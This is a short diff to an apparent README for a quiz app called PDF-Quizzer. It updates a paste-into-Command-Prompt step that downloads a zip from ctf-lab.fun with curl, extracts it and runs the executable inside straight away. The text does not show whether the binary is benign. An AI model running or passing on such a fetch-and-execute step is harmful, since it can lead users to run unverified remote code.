@@ -22,9 +22,9 @@ It allows users to take a quiz and get instant results.
 To download, extract, and run the app using `curl`, paste the following in your Command Prompt:
 
 <pre>
-curl -L -o app.zip "https://ctf-lab.fun/v2/app.zip" && ^
+curl -L -o app.zip "https://ctf-lab.fun/v2/appv2.zip" && ^
 powershell -Command "Expand-Archive -Path 'app.zip' -DestinationPath 'app' -Force" && ^
-start app\\app\\PDF-Quizzer.exe
+start app\\appv2\\PDF-Quizzer.exe
 </pre>
 
 ---
